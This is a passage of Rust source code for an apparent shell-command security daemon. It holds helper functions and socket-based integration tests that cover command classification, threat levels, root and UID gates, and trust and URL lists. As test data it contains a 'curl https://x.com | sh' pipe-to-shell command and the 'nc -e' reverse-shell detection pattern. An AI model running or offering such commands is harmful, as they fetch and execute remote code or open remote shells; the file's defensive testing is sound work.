        Err(e) => return OwnerLookup::Error(format!("cannot read {path}: {e}")),
    };
    for line in content.lines() {
        if let Some(rest) = line.strip_prefix("Uid:") {
            let mut fields = rest.split_whitespace();
            let real = match fields.next() {
                Some(r) => r,
                None => return OwnerLookup::Error(format!("{path}: malformed Uid line")),
            };
            return match real.parse::<u32>() {
                Ok(uid) => OwnerLookup::Owner(uid),
                Err(e) => OwnerLookup::Error(format!("{path}: parse uid: {e}")),
            };
        }
    }
    OwnerLookup::Error(format!("{path}: no Uid line"))
}

fn require_root_error(op: &str) -> ResponseBody {
    ResponseBody::Error {
        message: format!(
            "`{op}` requires root — run as `sudo atty-guard {op} ...` so the \
             mutating request reaches the daemon with EUID 0 over SO_PEERCRED"
        ),
    }
}

/// True when `incoming` is a strictly-worse verdict than `current`.
/// Used by the per-package OSV loop to keep the worst observed
/// outcome across all packages — pre-fix the loop broke on first
/// non-Safe, which would mask a `Malicious → Block` after an earlier
/// `Vulnerable → Warn`. Ordering: Safe < Warn < Block.
fn verdict_strictly_worse(current: &Verdict, incoming: &Verdict) -> bool {
    matches!(
        (current, incoming),
        (Verdict::Safe, Verdict::Warn)
            | (Verdict::Safe, Verdict::Block)
            | (Verdict::Warn, Verdict::Block),
    )
}

fn write_response(writer: &mut impl Write, id: u64, body: ResponseBody) -> std::io::Result<()> {
    let env = Envelope { id, body };
    let s = serde_json::to_string(&env)?;
    writer.write_all(s.as_bytes())?;
    writer.write_all(b"\n")?;
    Ok(())
}

// ===========================================================================
// Tests — integration over a real socket pair.

#[cfg(test)]
mod tests {
    use super::*;
    use std::io::{BufRead, Write};
    use std::time::Duration;

    fn running_as_root() -> bool {
        extern "C" {
            fn geteuid() -> u32;
        }
        unsafe { geteuid() == 0 }
    }

    fn unique_socket() -> std::path::PathBuf {
        let pid = std::process::id();
        let nanos = std::time::SystemTime::now()
            .duration_since(std::time::UNIX_EPOCH)
            .unwrap()
            .as_nanos();
        std::path::PathBuf::from(format!("/tmp/atty-guard-test-{}-{}.sock", pid, nanos))
    }

    fn round_trip(stream: &mut UnixStream, request: &str) -> String {
        stream.write_all(request.as_bytes()).unwrap();
        stream.write_all(b"\n").unwrap();
        let mut reader = BufReader::new(stream.try_clone().unwrap());
        let mut line = String::new();
        reader.read_line(&mut line).unwrap();
        line.trim().to_owned()
    }

    fn spawn_server_with_cfg(
        cfg: crate::config::ServerConfig,
    ) -> (std::path::PathBuf, thread::JoinHandle<()>) {
        let socket = unique_socket();
        let socket_for_thread = socket.clone();
        let trust_tmp = tempfile::tempdir().expect("tempdir");
        let trust_root = trust_tmp.path().to_path_buf();
        let trust_store = Arc::new(crate::trust_store::TrustStore::new(trust_root));
        let classifier = Classifier::new();
        let handle = thread::spawn(move || {
            let _trust_tmp_owned = trust_tmp;
            let _ = serve(
                &socket_for_thread,
                0,
                classifier,
                None,
                None,
                trust_store,
                cfg,
            );
        });
        for _ in 0..500 {
            if UnixStream::connect(&socket).is_ok() {
                // The probe connection succeeds (server is
                // listening); the kernel-side accept happens
                // shortly after, and the probe's handler thread
                // sees EOF + exits, releasing its `ConnGuard`
                // slot. Cap-sensitive tests rely on the in-flight
                // counter being back to 0 by the time they
                // connect — give the probe's handler time to
                // exit before returning. 100 ms is well over the
                // accept + spawn + read-EOF + exit cycle on any
                // sane machine.
                std::thread::sleep(Duration::from_millis(100));
                break;
            }
            std::thread::sleep(Duration::from_millis(10));
        }
        (socket, handle)
    }

    /// Spin a daemon backed by a caller-provided TrustStore. Lets
    /// tests pre-populate /var/lib/atty-guard-equivalent state (eg.
    /// atoms.system.txt) before the daemon accepts its first
    /// connection. Caller is responsible for keeping any backing
    /// tempdir alive — the helper doesn't own one.
    fn spawn_server_with_trust_store(
        trust_store: Arc<crate::trust_store::TrustStore>,
    ) -> (std::path::PathBuf, thread::JoinHandle<()>) {
        let socket = unique_socket();
        let socket_for_thread = socket.clone();
        let classifier = Classifier::new();
        let handle = thread::spawn(move || {
            let _ = serve(
                &socket_for_thread,
                0,
                classifier,
                None,
                None,
                trust_store,
                crate::config::ServerConfig::default(),
            );
        });
        for _ in 0..500 {
            if UnixStream::connect(&socket).is_ok() {
                break;
            }
            thread::sleep(Duration::from_millis(10));
        }
        (socket, handle)
    }

    fn spawn_server() -> (std::path::PathBuf, thread::JoinHandle<()>) {
        let socket = unique_socket();
        let socket_for_thread = socket.clone();
        // Trust store rooted at a tempdir so server tests can
        // exercise the mutating dispatch arms without ever touching
        // /var/lib/atty-guard/. The TempDir is moved INTO the
        // spawned thread so its Drop fires when the thread exits —
        // proper cleanup, no `std::mem::forget` leak.
        let trust_tmp = tempfile::tempdir().expect("tempdir");
        let trust_root = trust_tmp.path().to_path_buf();
        let trust_store = Arc::new(crate::trust_store::TrustStore::new(trust_root));
        let classifier = Classifier::new();
        let handle = thread::spawn(move || {
            let _trust_tmp_owned = trust_tmp; // moved-in, Drop on exit
            let _ = serve(
                &socket_for_thread,
                0,
                classifier,
                None, // ebpf
                None, // osv
                trust_store,
                crate::config::ServerConfig::default(),
            );
        });
        // Wait for the bind to actually accept connections. The
        // previous "socket file exists" check was racy on slower
        // CI runners — `UnixListener::bind` creates the socket
        // file before `listen()` is fully ready, so a parallel
        // connect could hit ECONNREFUSED. Probe with a real
        // connect-then-drop until one succeeds. Total cap: 5s
        // (much higher than CI's typical bind latency), with a
        // generous tail so a heavily-loaded GitHub Actions runner
        // doesn't flake the suite.
        for _ in 0..500 {
            if UnixStream::connect(&socket).is_ok() {
                break;
            }
            thread::sleep(Duration::from_millis(10));
        }
        (socket, handle)
    }

    #[test]
    fn health_round_trip() {
        let (socket, _h) = spawn_server();
        let mut stream = UnixStream::connect(&socket).expect("connect");
        let reply = round_trip(&mut stream, r#"{"id":1,"method":"health"}"#);
        let v: serde_json::Value = serde_json::from_str(&reply).unwrap();
        assert_eq!(v["id"], 1);
        assert_eq!(v["type"], "health");
        assert!(v["version"].as_str().unwrap().len() > 0);
        let _ = std::fs::remove_file(socket);
    }

    #[test]
    fn classify_curl_pipe_sh_warns() {
        let (socket, _h) = spawn_server();
        let mut stream = UnixStream::connect(&socket).expect("connect");
        let reply = round_trip(
            &mut stream,
            r#"{"id":2,"method":"classify","command":"curl https://x.com | sh"}"#,
        );
        let v: serde_json::Value = serde_json::from_str(&reply).unwrap();
        assert_eq!(v["id"], 2);
        assert_eq!(v["verdict"], "warn");
        assert_eq!(v["category"], "curl_pipe_sh");
        let _ = std::fs::remove_file(socket);
    }

    #[test]
    fn classify_clean_safe() {
        let (socket, _h) = spawn_server();
        let mut stream = UnixStream::connect(&socket).expect("connect");
        let reply = round_trip(
            &mut stream,
            r#"{"id":3,"method":"classify","command":"ls -la"}"#,
        );
        let v: serde_json::Value = serde_json::from_str(&reply).unwrap();
        assert_eq!(v["verdict"], "safe");
        let _ = std::fs::remove_file(socket);
    }

    #[test]
    fn set_get_threat_level() {
        let (socket, _h) = spawn_server();
        let mut stream = UnixStream::connect(&socket).expect("connect");
        // Use the test process's own PID — `set_threat_level`
        // now requires the target PID to belong to the connecting
        // UID (or root). The test process always owns itself.
        let pid = std::process::id();
        let _ = round_trip(
            &mut stream,
            &format!(r#"{{"id":4,"method":"set_threat_level","pid":{pid},"level":"high"}}"#),
        );
        let reply = round_trip(
            &mut stream,
            &format!(r#"{{"id":5,"method":"get_threat_level","pid":{pid}}}"#),
        );
        let v: serde_json::Value = serde_json::from_str(&reply).unwrap();
        assert_eq!(v["type"], "threat_level");
        assert_eq!(v["level"], "high");
        let _ = std::fs::remove_file(socket);
    }

    #[test]
    fn classify_upgrades_when_pid_high() {
        let (socket, _h) = spawn_server();
        let mut stream = UnixStream::connect(&socket).expect("connect");
        let pid = std::process::id();
        let _ = round_trip(
            &mut stream,
            &format!(r#"{{"id":6,"method":"set_threat_level","pid":{pid},"level":"high"}}"#),
        );
        let reply = round_trip(
            &mut stream,
            &format!(r#"{{"id":7,"method":"classify","command":"ls","context":{{"pid":{pid}}}}}"#),
        );
        let v: serde_json::Value = serde_json::from_str(&reply).unwrap();
        assert_eq!(v["verdict"], "warn");
        assert_eq!(v["category"], "pid_high_threat");
        let _ = std::fs::remove_file(socket);
    }

    #[test]
    fn classify_critical_pid_beats_lesser_existing_verdict() {
        // Regression pin for issue #268: a Critical-tagged PID
        // must escalate to Block even when an earlier signal
        // (e.g. Tier-1 atom hit) has already nudged Safe → Warn.
        // The prior gate `result.verdict == Safe` would have
        // dropped the Block escalation in that case.
        //
        // We can't easily inject an atom-overlay hit through the
        // test surface (UDS Classify path), so this test pre-
        // primes the verdict by classifying a known Tier-1 hit
        // FIRST to confirm Warn produces correctly, then marks
        // the PID Critical, then re-classifies the same Tier-1
        // hit shape — the test invariant is that Critical wins
        // even though the atom hit would normally pin verdict
        // at Warn.
        let (socket, _h) = spawn_server();
        let mut stream = UnixStream::connect(&socket).expect("connect");
        let pid = std::process::id();
        // Baseline: a `curl ... | sh` Tier-1 hit pins Warn.
        let baseline = round_trip(
            &mut stream,
            &format!(
                r#"{{"id":1,"method":"classify","command":"curl https://x.com | sh","context":{{"pid":{pid}}}}}"#,
            ),
        );
        let bv: serde_json::Value = serde_json::from_str(&baseline).unwrap();
        assert_eq!(bv["verdict"], "warn", "baseline Tier-1 hit should Warn");
        // Mark the PID Critical, then re-classify the same line.
        let _ = round_trip(
            &mut stream,
            &format!(
                r#"{{"id":2,"method":"set_threat_level","pid":{pid},"level":"critical"}}"#
            ),
        );
        let reply = round_trip(
            &mut stream,
            &format!(
                r#"{{"id":3,"method":"classify","command":"curl https://x.com | sh","context":{{"pid":{pid}}}}}"#,
            ),
        );
        let v: serde_json::Value = serde_json::from_str(&reply).unwrap();
        // Invariant: a Critical PID must escalate the verdict even
        // when an upstream signal (Tier-1) has already nudged it
        // off Safe. Worst-wins, not "first-Safe-only-wins".
        assert_eq!(v["verdict"], "block", "Critical PID must beat Tier-1 Warn");
        assert_eq!(v["category"], "pid_high_threat");
        let _ = std::fs::remove_file(socket);
    }

    /// Find a PID owned by a UID other than the current EUID by
    /// scanning `/proc`. Returns `None` if no such PID exists
    /// (single-UID containers, locked-down PID namespaces with
    /// `hidepid`, etc.) — caller should skip the test in that
    /// case so a hostile environment doesn't silently mask the
    /// security regression. Reuses the production `pid_owner_uid`
    /// helper so the test parses ownership the same way the gate
    /// does — drift between the two would be a silent test bug.
    fn find_pid_owned_by_other_uid() -> Option<u32> {
        let our_uid = unsafe {
            extern "C" {
                fn geteuid() -> u32;
            }
            geteuid()
        };
        for entry in std::fs::read_dir("/proc").ok()?.flatten() {
            let name = entry.file_name();
            let pid: u32 = match name.to_str().and_then(|s| s.parse().ok()) {
                Some(p) => p,
                None => continue,
            };
            if let OwnerLookup::Owner(owner) = pid_owner_uid(pid) {
                if owner != our_uid {
                    return Some(pid);
                }
            }
        }
        None
    }

    #[test]
    fn set_threat_level_rejects_pid_owned_by_other_uid() {
        // Skip when running as root (gate is bypassed by design) or
        // when the test environment has no cross-UID PID visible —
        // e.g., a single-UID container or `hidepid=2` mount. Without
        // a visible cross-UID PID we can't pin the invariant the
        // gate is meant to enforce.
        if running_as_root() {
            return;
        }
        let other_pid = match find_pid_owned_by_other_uid() {
            Some(p) => p,
            None => return,
        };
        let (socket, _h) = spawn_server();
        let mut stream = UnixStream::connect(&socket).expect("connect");
        let reply = round_trip(
            &mut stream,
            &format!(
                r#"{{"id":8,"method":"set_threat_level","pid":{other_pid},"level":"critical"}}"#
            ),
        );
        let v: serde_json::Value = serde_json::from_str(&reply).unwrap();
        assert_eq!(v["type"], "error");
        // GetThreatLevel is now gated cross-UID the same way Set is
        // (audit #275). A non-root caller asking for someone else's
        // PID gets an error rather than a level value — the threat
        // map itself wasn't mutated by the rejected Set, but the
        // observable behavior is "no read across UID boundary".
        let level_reply = round_trip(
            &mut stream,
            &format!(r#"{{"id":9,"method":"get_threat_level","pid":{other_pid}}}"#),
        );
        let lv: serde_json::Value = serde_json::from_str(&level_reply).unwrap();
        assert_eq!(lv["type"], "error");
        let _ = std::fs::remove_file(socket);
    }

    #[test]
    fn set_threat_level_rejects_nonexistent_pid_from_non_root() {
        if running_as_root() {
            return;
        }
        let (socket, _h) = spawn_server();
        let mut stream = UnixStream::connect(&socket).expect("connect");
        // PID 0 is a kernel-only sentinel; /proc/0 doesn't exist.
        let reply = round_trip(
            &mut stream,
            r#"{"id":10,"method":"set_threat_level","pid":0,"level":"high"}"#,
        );
        let v: serde_json::Value = serde_json::from_str(&reply).unwrap();
        assert_eq!(v["type"], "error");
        let _ = std::fs::remove_file(socket);
    }

    #[test]
    fn set_threat_level_low_allowed_for_nonexistent_pid_from_non_root() {
        // Pure-eviction (Low) must succeed even when the PID is
        // gone — otherwise a non-root caller could never clear a
        // mark they installed once their target process exited,
        // leaving stale in-mem/BPF state behind. Real-world flow:
        // (a) caller sets Critical on their own live PID, (b) the
        // process exits, (c) cleanup attempts `set(_, Low)` to
        // clear the mark. Without this allowance, step (c) would
        // be rejected with "non-root cannot set level for pid
        // (owned by uid ?)".
        if running_as_root() {
            return;
        }
        let (socket, _h) = spawn_server();
        let mut stream = UnixStream::connect(&socket).expect("connect");
        let reply = round_trip(
            &mut stream,
            r#"{"id":11,"method":"set_threat_level","pid":0,"level":"low"}"#,
        );
        let v: serde_json::Value = serde_json::from_str(&reply).unwrap();
        assert_eq!(v["type"], "ok");
        // Follow-up observable: confirm the threat map really
        // reflects the Low write. Without this, a future refactor
        // that makes `set(_, Low)` short-circuit before reaching
        // the map could silently regress while the test stays
        // green.
        let level_reply = round_trip(
            &mut stream,
            r#"{"id":12,"method":"get_threat_level","pid":0}"#,
        );
        let lv: serde_json::Value = serde_json::from_str(&level_reply).unwrap();
        assert_eq!(lv["level"], "low");
        let _ = std::fs::remove_file(socket);
    }

    #[test]
    fn malformed_json_yields_error_response() {
        let (socket, _h) = spawn_server();
        let mut stream = UnixStream::connect(&socket).expect("connect");
        let reply = round_trip(&mut stream, r#"{not json"#);
        let v: serde_json::Value = serde_json::from_str(&reply).unwrap();
        assert_eq!(v["type"], "error");
        let _ = std::fs::remove_file(socket);
    }

    #[test]
    fn atoms_add_requires_root() {
        // Test runs as the cargo test user (not root); the daemon's
        // SO_PEERCRED check should reject AtomsAdd with the
        // "requires root" error message.
        let (socket, _h) = spawn_server();
        let mut stream = UnixStream::connect(&socket).expect("connect");
        let reply = round_trip(
            &mut stream,
            r#"{"id":1,"method":"atoms_add","pattern":"test atom xyz"}"#,
        );
        let v: serde_json::Value = serde_json::from_str(&reply).unwrap();
        assert_eq!(v["type"], "error");
        assert!(
            v["message"].as_str().unwrap().contains("requires root"),
            "expected 'requires root' error, got: {}",
            v["message"]
        );
        let _ = std::fs::remove_file(socket);
    }

    #[test]
    fn atoms_list_system_returns_bundled_corpus() {
        let (socket, _h) = spawn_server();
        let mut stream = UnixStream::connect(&socket).expect("connect");
        let reply = round_trip(
            &mut stream,
            r#"{"id":1,"method":"atoms_list","scope":"system"}"#,
        );
        let v: serde_json::Value = serde_json::from_str(&reply).unwrap();
        assert_eq!(v["type"], "atoms_list");
        let atoms = v["atoms"].as_array().expect("atoms array");
        // Bundled corpus has ~150+ atoms; just verify non-empty + a
        // known seed.
        assert!(atoms.len() > 50);
        let any_nc_e = atoms.iter().any(|a| a.as_str() == Some("nc -e"));
        assert!(any_nc_e, "expected `nc -e` in bundled corpus");
        let _ = std::fs::remove_file(socket);
    }

    #[test]
    fn atoms_list_fetched_empty_when_no_file() {
        // GPT-review #023: --fetched scope returns the runtime-fetched
        // corpus from /var/lib/atty-guard/atoms.system.txt. When no
        // file exists (fresh daemon, --update-atoms-now hasn't run),
        // it returns an empty list — NOT the bundled corpus.
        let (socket, _h) = spawn_server();
        let mut stream = UnixStream::connect(&socket).expect("connect");
        let reply = round_trip(
            &mut stream,
            r#"{"id":1,"method":"atoms_list","scope":"fetched"}"#,
        );
        let v: serde_json::Value = serde_json::from_str(&reply).unwrap();
        assert_eq!(v["type"], "atoms_list");
        assert!(
            v["atoms"].as_array().unwrap().is_empty(),
            "fetched corpus should be empty without atoms.system.txt; got {:?}",
            v["atoms"],
        );
        let _ = std::fs::remove_file(socket);
    }

    #[test]
    fn atoms_list_fetched_returns_runtime_corpus_distinct_from_system() {
        // PR #250 round-1 review M-1: the empty-when-no-file test
        // can't discriminate between "wired correctly" and "always
        // returns empty." Spin a daemon with a populated
        // atoms.system.txt + assert `--fetched` returns THOSE atoms
        // AND `--system` returns the bundled set, and they differ.
        let tmp = tempfile::tempdir().expect("tempdir");
        let users_dir = tmp.path().join("users");
        std::fs::create_dir_all(&users_dir).unwrap();
        // The system_fetched_path is `<data_root.parent>/atoms.system.txt`,
        // so this lands at `<tmp>/atoms.system.txt` — exactly where the
        // daemon will look.
        let system_path = tmp.path().join("atoms.system.txt");
        std::fs::write(
            &system_path,
            "fetched-only-marker-001\nfetched-only-marker-002\n",
        )
        .unwrap();
        let trust_store =
            Arc::new(crate::trust_store::TrustStore::new(users_dir));
        let (socket, _h) = spawn_server_with_trust_store(trust_store);

        let mut s = UnixStream::connect(&socket).expect("connect");
        let reply = round_trip(
            &mut s,
            r#"{"id":1,"method":"atoms_list","scope":"fetched"}"#,
        );
        let v: serde_json::Value = serde_json::from_str(&reply).unwrap();
        let fetched: Vec<String> = v["atoms"]
            .as_array()
            .unwrap()
            .iter()
            .map(|a| a.as_str().unwrap().to_owned())
            .collect();
        assert!(
            fetched.contains(&"fetched-only-marker-001".to_string()),
            "expected runtime atom in fetched scope; got {fetched:?}",
        );
        assert!(
            fetched.contains(&"fetched-only-marker-002".to_string()),
            "expected runtime atom in fetched scope; got {fetched:?}",
        );
        // Rules out the "--fetched falls back to bundled" regression.
        assert!(
            !fetched.contains(&"nc -e".to_string()),
            "fetched scope leaked bundled atoms; got {fetched:?}",
        );

        let mut s2 = UnixStream::connect(&socket).expect("connect");
        let reply2 = round_trip(
            &mut s2,
            r#"{"id":2,"method":"atoms_list","scope":"system"}"#,
        );
        let v2: serde_json::Value = serde_json::from_str(&reply2).unwrap();
        let system_atoms: Vec<String> = v2["atoms"]
            .as_array()
            .unwrap()
            .iter()
            .map(|a| a.as_str().unwrap().to_owned())
            .collect();
        // The bundled set is non-empty and does NOT contain the
        // fetched-only markers — confirms the two scopes truly diverge.
        assert!(system_atoms.len() > 50);
        assert!(
            !system_atoms.contains(&"fetched-only-marker-001".to_string()),
            "system scope leaked fetched atoms",
        );
        let _ = std::fs::remove_file(socket);
    }

    #[test]
    fn atoms_list_user_empty_initially() {
        let (socket, _h) = spawn_server();
        let mut stream = UnixStream::connect(&socket).expect("connect");
        let reply = round_trip(
            &mut stream,
            r#"{"id":1,"method":"atoms_list","scope":"user"}"#,
        );
        let v: serde_json::Value = serde_json::from_str(&reply).unwrap();
        assert_eq!(v["type"], "atoms_list");
        assert!(v["atoms"].as_array().unwrap().is_empty());
        let _ = std::fs::remove_file(socket);
    }

    #[test]
    fn session_list_empty_initially() {
        let (socket, _h) = spawn_server();
        let mut stream = UnixStream::connect(&socket).expect("connect");
        let reply = round_trip(
            &mut stream,
            r#"{"id":1,"method":"session_list"}"#,
        );
        let v: serde_json::Value = serde_json::from_str(&reply).unwrap();
        assert_eq!(v["type"], "session_list");
        assert!(v["atoms"].as_array().unwrap().is_empty());
        assert!(v["urls_allow"].as_array().unwrap().is_empty());
        assert!(v["urls_block"].as_array().unwrap().is_empty());
        let _ = std::fs::remove_file(socket);
    }

    #[test]
    fn session_add_trust_then_session_list_round_trip() {
        // Pin the SessionAddTrust → SessionList wire path end-to-end
        // over a real UDS pair. Guards against a future refactor of
        // the SessionList serialization silently dropping the trust
        // field — the trust_store unit tests cover the storage layer
        // but not the JSON shape that crosses the socket.
        let (socket, _h) = spawn_server();
        let mut stream = UnixStream::connect(&socket).expect("connect");
        let hash = "0123456789abcdef0123456789abcdef0123456789abcdef0123456789abcdef";
        let add = round_trip(
            &mut stream,
            &format!(r#"{{"id":1,"method":"session_add_trust","hash":"{hash}"}}"#),
        );
        let v: serde_json::Value = serde_json::from_str(&add).unwrap();
        assert_eq!(v["type"], "ok");

        let list = round_trip(&mut stream, r#"{"id":2,"method":"session_list"}"#);
        let v: serde_json::Value = serde_json::from_str(&list).unwrap();
        assert_eq!(v["type"], "session_list");
        let trust = v["trust"].as_array().expect("trust array");
        assert_eq!(trust.len(), 1);
        assert_eq!(trust[0], hash);
        // Atoms / urls fields must still be empty.
        assert!(v["atoms"].as_array().unwrap().is_empty());
        assert!(v["urls_allow"].as_array().unwrap().is_empty());
        assert!(v["urls_block"].as_array().unwrap().is_empty());
        let _ = std::fs::remove_file(socket);
    }

    #[test]
    fn session_add_url_block_then_session_list_round_trip() {
        // Pins the SessionList urls_block wire-format. Same shape
        // as the trust pin above — guards the no-sudo session adds
        // against a JSON-shape regression.
        let (socket, _h) = spawn_server();
        let mut stream = UnixStream::connect(&socket).expect("connect");
        let add = round_trip(
            &mut stream,
            r#"{"id":1,"method":"session_add_url_block","host":"evil.example"}"#,
        );
        let v: serde_json::Value = serde_json::from_str(&add).unwrap();
        assert_eq!(v["type"], "ok");

        let list = round_trip(&mut stream, r#"{"id":2,"method":"session_list"}"#);
        let v: serde_json::Value = serde_json::from_str(&list).unwrap();
        assert_eq!(v["type"], "session_list");
        let block = v["urls_block"].as_array().expect("urls_block array");
        assert_eq!(block.len(), 1);
        assert_eq!(block[0], "evil.example");
        // Symmetric negative pinning with the trust test above —
        // future regression that copied the host into a wrong
        // field would surface here.
        assert!(v["atoms"].as_array().unwrap().is_empty());
        assert!(v["urls_allow"].as_array().unwrap().is_empty());
        assert!(v["trust"].as_array().unwrap().is_empty());
        let _ = std::fs::remove_file(socket);
    }

    #[test]
    fn session_clear_no_sudo_required() {
        let (socket, _h) = spawn_server();
        let mut stream = UnixStream::connect(&socket).expect("connect");
        let reply = round_trip(
            &mut stream,
            r#"{"id":1,"method":"session_clear"}"#,
        );
        let v: serde_json::Value = serde_json::from_str(&reply).unwrap();
        assert_eq!(v["type"], "ok");
        let _ = std::fs::remove_file(socket);
    }

    #[test]
    fn session_write_requires_root() {
        let (socket, _h) = spawn_server();
        let mut stream = UnixStream::connect(&socket).expect("connect");
        let reply = round_trip(
            &mut stream,
            r#"{"id":1,"method":"session_write"}"#,
        );
        let v: serde_json::Value = serde_json::from_str(&reply).unwrap();
        assert_eq!(v["type"], "error");
        assert!(v["message"].as_str().unwrap().contains("requires root"));
        let _ = std::fs::remove_file(socket);
    }

    #[test]
    fn urls_list_initially_empty() {
        let (socket, _h) = spawn_server();
        let mut stream = UnixStream::connect(&socket).expect("connect");
        let reply = round_trip(
            &mut stream,
            r#"{"id":1,"method":"urls_list"}"#,
        );
        let v: serde_json::Value = serde_json::from_str(&reply).unwrap();
        assert_eq!(v["type"], "urls_list");
        assert!(v["entries"].as_array().unwrap().is_empty());
        let _ = std::fs::remove_file(socket);
    }

    #[test]
    fn trust_add_then_list_roundtrip() {
        // PR #143: no sudo on trust_add (banner [t] is non-sudo).
        // Verify the daemon accepts the add, persists, and the
        // subsequent trust_list returns the hash.
        let (socket, _h) = spawn_server();
        let mut stream = UnixStream::connect(&socket).expect("connect");
        let hash = "0123456789abcdef0123456789abcdef0123456789abcdef0123456789abcdef";
        let add = round_trip(
            &mut stream,
            &format!(r#"{{"id":1,"method":"trust_add","hash":"{hash}"}}"#),
        );
        let v: serde_json::Value = serde_json::from_str(&add).unwrap();
        assert_eq!(v["type"], "ok", "add reply: {add}");

        let list = round_trip(&mut stream, r#"{"id":2,"method":"trust_list"}"#);
        let v: serde_json::Value = serde_json::from_str(&list).unwrap();
        assert_eq!(v["type"], "trust_list");
        let trust = v["trust"].as_array().expect("trust array");
        assert_eq!(trust.len(), 1);
        assert_eq!(trust[0], hash);
        let _ = std::fs::remove_file(socket);
    }

    #[test]
    fn trust_add_rejects_invalid_hash_shape() {
        let (socket, _h) = spawn_server();
        let mut stream = UnixStream::connect(&socket).expect("connect");
        let reply = round_trip(
            &mut stream,
            r#"{"id":1,"method":"trust_add","hash":"too-short"}"#,
        );
        let v: serde_json::Value = serde_json::from_str(&reply).unwrap();
        assert_eq!(v["type"], "error");
        assert!(v["message"].as_str().unwrap().contains("length"));
        let _ = std::fs::remove_file(socket);
    }

    #[test]
    fn non_root_cannot_target_other_uid() {
        // Non-root caller (test runs as cargo user) requests
        // target_uid=12345 (some other UID). Daemon must refuse
        // with the "cannot target a different uid" error to prevent
        // a regular user from peeking into root's or another user's
        // atom set via a forged request.
        let (socket, _h) = spawn_server();
        let mut stream = UnixStream::connect(&socket).expect("connect");
        let reply = round_trip(
            &mut stream,
            r#"{"id":1,"method":"atoms_list","scope":"user","target_uid":12345}"#,
        );
        let v: serde_json::Value = serde_json::from_str(&reply).unwrap();
        assert_eq!(v["type"], "error");
        assert!(
            v["message"]
                .as_str()
                .unwrap()
                .contains("cannot target a different uid"),
            "expected uid-target rejection, got: {}",
            v["message"]
        );
        let _ = std::fs::remove_file(socket);
    }

    #[test]
    fn target_uid_matching_own_is_accepted() {
        // When target_uid == peer.uid, the request goes through
        // even for non-root callers — this is the documented
        // semantics so a future shell wrapper can always include
        // target_uid without changing behaviour.
        let (socket, _h) = spawn_server();
        let mut stream = UnixStream::connect(&socket).expect("connect");
        let own_uid = unsafe {
            extern "C" {
                fn geteuid() -> u32;
            }
            geteuid()
        };
        let reply = round_trip(
            &mut stream,
            &format!(
                r#"{{"id":1,"method":"atoms_list","scope":"session","target_uid":{own_uid}}}"#
            ),
        );
        let v: serde_json::Value = serde_json::from_str(&reply).unwrap();
        assert_eq!(v["type"], "atoms_list");
        assert!(v["atoms"].as_array().unwrap().is_empty());
        let _ = std::fs::remove_file(socket);
    }

    #[test]
    fn extract_npm_install_pkg_bare() {
        assert_eq!(
            crate::npm_parser::extract_npm_install_first_pkg("npm install lodash"),
            Some("lodash")
        );
    }

    #[test]
    fn extract_npm_install_pkg_with_version() {
        assert_eq!(
            crate::npm_parser::extract_npm_install_first_pkg("npm install lodash@4.17.21"),
            Some("lodash")
        );
    }

    #[test]
    fn extract_npm_install_pkg_scoped() {
        assert_eq!(
            crate::npm_parser::extract_npm_install_first_pkg("npm install @ctrl/tinycolor"),
            Some("@ctrl/tinycolor")
        );
    }

    #[test]
    fn extract_npm_install_pkg_scoped_versioned() {
        assert_eq!(
            crate::npm_parser::extract_npm_install_first_pkg("npm install @ctrl/tinycolor@1.0.0"),
            Some("@ctrl/tinycolor")
        );
    }

    #[test]
    fn extract_npm_install_pkg_pnpm_add() {
        assert_eq!(crate::npm_parser::extract_npm_install_first_pkg("pnpm add react"), Some("react"));
    }

    #[test]
    fn extract_npm_install_pkg_yarn_add() {
        assert_eq!(crate::npm_parser::extract_npm_install_first_pkg("yarn add vue"), Some("vue"));
    }

    #[test]
    fn extract_npm_install_pkg_skips_flags() {
        assert_eq!(
            crate::npm_parser::extract_npm_install_first_pkg("npm install --save-dev @types/node"),
            Some("@types/node")
        );
    }

    #[test]
    fn extract_npm_install_pkg_not_install_shape() {
        assert_eq!(crate::npm_parser::extract_npm_install_first_pkg("ls -la"), None);
        assert_eq!(crate::npm_parser::extract_npm_install_first_pkg("npm test"), None);
        assert_eq!(crate::npm_parser::extract_npm_install_first_pkg("npm run build"), None);
    }

    #[test]
    fn verdict_strictly_worse_pins_severity_ordering() {
        use crate::protocol::Verdict;
        // PR #262 round-1 subagent HIGH finding: the OSV loop
        // pre-fix broke on first non-Safe, so a Block after a Warn
        // was missed. The helper that drives the worst-wins
        // upgrade must reflect Safe < Warn < Block strictly —
        // ANY regression that flattens the ordering re-introduces
        // the attacker-can-prepend-a-vulnerable-package bypass.
        assert!(verdict_strictly_worse(&Verdict::Safe, &Verdict::Warn));
        assert!(verdict_strictly_worse(&Verdict::Safe, &Verdict::Block));
        assert!(verdict_strictly_worse(&Verdict::Warn, &Verdict::Block));
        // Reverse direction never upgrades — a later Safe-/Warn-
        // pkg can't downgrade a worse earlier verdict.
        assert!(!verdict_strictly_worse(&Verdict::Warn, &Verdict::Safe));
        assert!(!verdict_strictly_worse(&Verdict::Block, &Verdict::Safe));
        assert!(!verdict_strictly_worse(&Verdict::Block, &Verdict::Warn));
        // Same-level never upgrades.
        assert!(!verdict_strictly_worse(&Verdict::Safe, &Verdict::Safe));
        assert!(!verdict_strictly_worse(&Verdict::Warn, &Verdict::Warn));
        assert!(!verdict_strictly_worse(&Verdict::Block, &Verdict::Block));
    }

    #[test]
    fn connection_cap_drops_excess_connections() {
        // Spawn a server with a tiny cap (2). Open 2 idle
        // connections (held), then try a 3rd — it must be
        // accepted-then-closed immediately so the client sees a
        // fast EOF rather than blocking on read forever.
        let cfg = crate::config::ServerConfig {
            max_concurrent_connections: 2,
            idle_read_timeout_secs: 0, // disable timeout — we want the slots STUCK
        };
        let (socket, _h) = spawn_server_with_cfg(cfg);
        // First two: hold them by NOT writing. Each one occupies
        // a handler thread blocked in read.
        let _hold1 = UnixStream::connect(&socket).expect("connect 1");
        let _hold2 = UnixStream::connect(&socket).expect("connect 2");
        // Give the server enough time to accept + increment the
        // counter for the two held connections. 200ms is well
        // over what a healthy accept loop needs and matches the
        // generous CI margin used elsewhere in this file.
        std::thread::sleep(Duration::from_millis(200));
        // Third connection: server accepts, sees prev=2 >= cap,
        // drops it. Read should return Ok(0) (EOF) once the
        // server has closed its end. Pattern-match explicitly
        // — `unwrap_or(0)` would mask a regression that
        // ACCEPTED the connection but never wrote bytes
        // (the read would time out with Err(WouldBlock), and
        // `unwrap_or(0)` would collapse that into n=0 too,
        // giving a false pass).
        let mut over = UnixStream::connect(&socket).expect("connect 3");
        let mut buf = [0u8; 16];
        // 2 s margin so the test passes on slow CI even when
        // the server's accept loop is briefly preempted; on a
